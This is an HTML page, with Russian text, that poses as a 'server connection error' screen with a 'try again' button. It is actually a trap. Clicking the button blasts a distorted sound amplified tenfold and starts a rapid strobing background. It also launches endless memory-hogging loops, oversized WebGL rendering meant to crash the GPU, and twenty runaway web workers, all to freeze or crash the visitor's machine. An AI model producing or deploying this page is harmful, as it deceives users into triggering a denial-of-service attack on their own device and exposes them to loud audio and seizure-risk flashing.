<!DOCTYPE html>
<html>
<head>
  <style>
    #trapButton {
      position: fixed;
      top: 60%; /* Сдвигаем кнопку ниже, чтобы дать место заголовку */
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 2rem 4rem;
      font-size: 2.5rem;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
      color: white;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
      transition: all 0.3s ease;
      z-index: 9999;
    }

    #trapButton:hover {
      transform: translate(-50%, -55%);
      box-shadow: 0 15px 30px rgba(0,0,0,0.3);
      background: linear-gradient(45deg, #ff8787, #66e0d9);
    }

    body {
      background: #1a1a2e;
      margin: 0;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    h1 {
      color: white;
      font-family: 'Arial', sans-serif;
      font-size: 3rem;
      text-align: center;
      margin-bottom: 2rem; /* Отступ между заголовком и кнопкой */
      z-index: 9999;
    }
  </style>
</head>
<body>
  <h1>Ошибка подключения к серверу</h1>
  <button id="trapButton">Попробуйте ещё раз</button>
  <audio id="nukeSound" src="sound.mp3" preload="auto"></audio>

  <script>
    const trigger = document.getElementById('trapButton');
    const audio = document.getElementById('nukeSound');
    
    const audioCtx = new AudioContext();
    let audioBuffer = null;

    async function loadAudio() {
      try {
        const response = await fetch('sound.mp3');
        const arrayBuffer = await response.arrayBuffer();
        audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
      } catch (e) {}
    }

    function playSound() {
      if (audioBuffer) {
        const source = audioCtx.createBufferSource();
        source.buffer = audioBuffer;
        
        const gainNode = audioCtx.createGain();
        gainNode.gain.value = 10.0;
        
        const distortion = audioCtx.createWaveShaper();
        distortion.curve = makeDistortionCurve(500);
        distortion.oversample = '4x';

        source.connect(distortion)
              .connect(gainNode)
              .connect(audioCtx.destination);
        
        source.start(0);
        
        audio.volume = 1.0;
        audio.play().catch(() => {});
      } else {
        audio.volume = 1.0;
        audio.play().catch(() => {});
      }
    }

    function makeDistortionCurve(amount) {
      const samples = 44100;
      const curve = new Float32Array(samples);
      const deg = Math.PI / 180;
      
      for (let i = 0; i < samples; ++i) {
        const x = (i * 2) / samples - 1;
        curve[i] = (3 + amount) * x * 20 * deg / (Math.PI + amount * Math.abs(x));
      }
      return curve;
    }

    loadAudio();

    trigger.onclick = () => {
      playSound();
      trigger.style.display = 'none';
      document.body.style.animation = 'flash 0.1s infinite';

      const instantLag = () => {
        const hugeArray = new ArrayBuffer(1024 * 1024 * 1024);
        const view = new Uint32Array(hugeArray);
        while(true) {
          for(let i = 0; i < view.length; i++) {
            view[i] = Math.random() * Math.sin(Date.now()) * 0xFFFFFFFF;
            view[i] *= Math.cos(view[i]) / Math.tan(i);
          }
        }
      };

      const gpuCrash = () => {
        const canvas = document.createElement('canvas');
        canvas.width = 32767;
        canvas.height = 32767;
        const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
        
        if (gl) {
          const texture = gl.createTexture();
          gl.bindTexture(gl.TEXTURE_2D, texture);
          gl.texImage2D(
            gl.TEXTURE_2D,
            0,
            gl.RGBA32F,
            32767,
            32767,
            0,
            gl.RGBA,
            gl.FLOAT,
            null
          );

          const render = () => {
            gl.clear(gl.COLOR_BUFFER_BIT);
            for(let i = 0; i < 1000; i++) {
              gl.drawArrays(gl.TRIANGLES, 0, 32767 * 32767);
            }
            requestAnimationFrame(render);
          };
          render();
        }
      };

      for(let i = 0; i < 50; i++) {
        setTimeout(() => {
          instantLag();
          gpuCrash();
        }, 0);
      }

      for(let i = 0; i < 20; i++) {
        new Worker(URL.createObjectURL(new Blob([`
          while(true) {
            let arr = new Float64Array(100000000);
            for(let i = 0; i < arr.length; i++) {
              arr[i] = Math.random() * Math.pow(Math.sin(i), 2);
            }
          }
        `])));
      }
    };

    document.head.innerHTML += `
      <style>
        @keyframes flash {
          0% { background: #ff6b6b; }
          33% { background: #4ecdc4; }
          66% { background: #45b7d1; }
          100% { background: #ff6b6b; }
        }
      </style>
    `;
  </script>
</body>
</html>
